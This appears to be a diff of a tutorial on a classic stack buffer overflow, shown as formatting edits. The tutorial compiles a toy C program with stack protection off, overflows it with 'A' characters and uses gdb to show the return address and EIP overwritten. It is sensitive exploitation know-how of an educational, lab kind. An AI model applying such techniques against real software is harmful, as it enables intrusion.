@@ -39,12 +39,14 @@ int main (int argc, const char* argv[]) {
 <p>There is a problem here: <strong>strcpy</strong>. This function copies the input to destination without having control of the amount, in other words, we can save more than 10 bytes and it will be ok, because the function doesn't check if it matches with the array's total bytes.</p>
 
 <p>Running the code:</p>
+
 ```
 gcc -m32 overflow.c -o overflow 
 ./overflow AAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 <p>The result is:</p>
+
 ```
 Try again. 
 *** stack smashing detected ***: <unknown> terminated
@@ -54,28 +56,33 @@ Aborted (core dumped)
 <p>There are several reasons that compilation is aborted, but in this case it may be because we are accessing an invalid memory address (unmapped memory).</p>
 
 <p>Then I write it:</p>
+
 ```
 gcc -m32 overflow.c -o overflow -fno-stack-protector
 ./overflow AAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 <p>The new result is:</p>
+
 ```
 Try again.
 Segmentation fault (core dumped)
 ```
 
 <p>I put:</p>
+
 ```
 gdb overflow
 ```
 
 <p>Now I can command stuffs to gdb </p>
+
 ```
 (gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 <p>I receive:</p>
+
 ```
 Starting program: /.../ AAAAAAAAAAAAAAAAAAAAAAAAA
 Try Again
@@ -85,6 +92,7 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 
 <p>So I would like to see registers info</p>
+
 ```
 (gdb) info registers
 ```
@@ -109,11 +117,13 @@ gs          0x63     99
 ```
 
 <p>If I  write it (in below) to get more info about the main function:</p>
+
 ```
 (gdb) disas main
 ``` 
 
 <p>I have this result:</p>
+
 ``` 
 Dump of assembler code for function main:
    0x56555612 <+0>:     lea     0x4(%esp),%ecx
@@ -160,6 +170,7 @@ End of assembler dump.
 <p>Now we know why the eip has the value 0x41414141,it's because we overwrite the return address on the stack when the function ends. It takes the address from the stack and puts it in the eip, so the processor will execute the instructions from this area, but it's an unmapped region, in other words, segmentation fault occurs.</p>
 
 <p>We're going to explore more about it:</p>
+
 ``` 
 disas secret
 ``` 
